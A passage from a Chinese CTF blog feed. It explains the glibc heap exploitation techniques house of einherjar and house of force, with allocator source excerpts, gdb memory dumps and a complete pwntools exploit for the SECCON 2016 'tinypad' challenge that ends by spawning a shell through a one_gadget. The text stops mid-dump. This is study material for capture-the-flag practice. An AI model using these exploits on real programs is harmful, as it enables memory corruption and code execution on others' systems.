class="built_in">memcpy</span> (newp, oldmem, sz);</span><br><span class="line"> (<span class="type">void</span>) tag_region (chunk2mem (oldp), sz);</span><br><span class="line">        _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> newp;</span><br></pre></td></tr></table></figure><p>如果以上条件都不满足</p><p>则调用_int_realloc函数进行分配</p><p>至于_int_realloc的函数暂时不做分析</p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>realloc在ctf中出现较少</p>]]></content>
    
    
    <summary type="html">calloc与malloc的异同</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="calloc" scheme="https://ixout.github.io/tags/calloc/"/>
    
    <category term="realloc" scheme="https://ixout.github.io/tags/realloc/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="https://ixout.github.io/posts/49295/"/>
    <id>https://ixout.github.io/posts/49295/</id>
    <published>2023-08-19T09:34:54.000Z</published>
    <updated>2023-12-24T08:38:08.017Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（<strong>合并低地址的 chunk</strong>），从而使得尽可能避免碎片化。</p><p><strong>利用条件:</strong>off-by-one(可写下一chunk的prev_size与prev_inuse位)</p><p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk(要本身可写可控)</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>free函数向低地址chunk合并的操作如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设在内存由低到高有A与B两个chunk</p><p>且A能够改写B的prev_size与prev_inuse位</p><p><strong>unlink的chunk地址由以下代码决定</strong></p><p><code>p = chunk_at_offset(p, -((long) prevsize));</code></p><p>因为prevsize(<strong>有符号数</strong>)也是可控的</p><p>因此只需要在目标地址伪造fakechunk绕过unlink的检查即可</p><p><strong>完整性检查</strong>:难以找到存储&amp;A的内存,故选择fakechunk-&gt;fd=fakechunk-&gt;bk=fakechunk</p><p><strong>size检查:</strong>通过fakechunk的size字段找到的nextchunk的prev_size字段是否等于fakechunk的size</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png" alt=""></p><p>这样最后就能在unsortedbin中放入一个任意位置的chunk</p><p>不过这个chunk的size大概率无法通过unsorted取出时的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>因此还需要再次写这个chunk的size为一个合适且合法的值</p><h2 id="2-29新限制"><a href="#2-29新限制" class="headerlink" title="2.29新限制"></a>2.29新限制</h2><p>2.29向低地址合并操作代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现多了一个检测(通过prevsize找到的chunk的size<strong>?=</strong>prevsize)</p><p>这就使得fakechunk的size必须和prevsize相同,而这样的话fakechunk的nextchunk必然还是原本的chunk,这样常常会使得fakechunk的size过大,从而被视作largebin进而会多出一些操作</p><p>因此,2.29及以后fakechunk的size字段必须和本chunk的prevsize相同</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 Seccon tinypad</strong></p><p>保护pie没开</p><p>漏洞有off_by_null</p><p>个人第一想法其实是:没开pie且数据段上存放指针—-&gt;可以打unlink</p><p>写hook执行system(‘/bin/sh’)或onegadget</p><p>exp都快写好了,才发现一个致命的点———-写的时候长度是由strlen定的,malloc_hook默认是null,也就是说就算指向了malloc_hook也写不了</p><p>于是只能学习ctfwiki的做法了(其实如果按以上想法做根本就没用到house of einherjar的知识)</p><p>思路如下:</p><p>常规泄露heap地址,libc地址;并以此得到heap与tinypad的偏移,environ的符号地址,one_gadget等等</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br></pre></td></tr></table></figure><p>先申请四个chunk</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure><p>其中chunk2之所以要在尾部写p64(0x11))</p><p>是因为chunk2将用以free触发unlink,其后又会检测chunk2下一chunk的prev_inuse状态,写p64(0x11))用于off_by_null将chunk2的size改为0x100后继续维持后续chunk正常被寻找</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br></pre></td></tr></table></figure><p>释放chunk1再重新分配以off_by_null写chunk2的size和prev_size</p><p>并将fakechunk写在tinypad上,注意绕过unlink检查(自己做的时候这里犯了个蠢,fake_size用偏移offset填充,使得通过size找到的chunk为chunk2,这样是能够绕过部分检查,但offset的大小使得chunk被视作largebin从而unlink多了一部分检查nextsize链,而我又没填充nextsize域)</p><p><code>delete(2)</code>删除chunk2触发unlink使得tinypad被联入unsortedbin</p><p>此时fakechunk的大小显然不合规</p><p>于是</p><p><code>edit(4,b&#39;4&#39;*0x20+p64(0)+p64(0x101)+p64(libc.symbols[&#39;__malloc_hook&#39;]+0x10+0x58)*2)</code></p><p>将fakechunk的size改为能适中的大小</p><p>之后<code>add(0xf0,b&#39;2&#39;*0xd0+p64(666)+p64(environ)+b&#39;a&#39;*8+p64(0x602148))</code>将其申请出来并写memo1和memo2的指针</p><p>以此写main的返回地址</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">0x58</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())<span class="comment">#too much,可以接收太多遗留信息了,以后函数尽量使用sendlineafter编写</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="comment">#p.recvall()</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">666</span>)+p64(environ)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x602148</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;INDEX: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">main_ret=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">240</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_ret))</span><br><span class="line">edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House Of Force 是一种堆利用方法,主要通过修改top_chunk的size足够大使得申请出一个偏移大小的chunk后,top_chunk更新到指向目标地址,当再次申请chunk时得到一个包含目标地址的chunk</p><p><strong>利用条件:</strong></p><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理,进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p><p>glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是前面说的需要一个能够控制 top chunk size 域的漏洞。</p><p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成<strong>无符号数</strong>，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证</p><p>之后会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p><p>与此同时，我们需要注意的是，topchunk 的 size 也会更新</p><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p><strong>篡改 <code>malloc@got.plt</code> 实现劫持程序流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;        // &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br><span class="line">    malloc(-4120);  // &lt;=== 减小top chunk指针</span><br><span class="line">    malloc(0x10);   // &lt;=== 分配块实现任意地址写</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们分配一个 0x10 字节大小的块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0xffffffffffffffff &lt;=== top chunk size域被更改</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure><p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt</span><br></pre></td></tr></table></figure><p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p><p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p><p><code>0x601010-0x602020=-4112</code></p><p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span 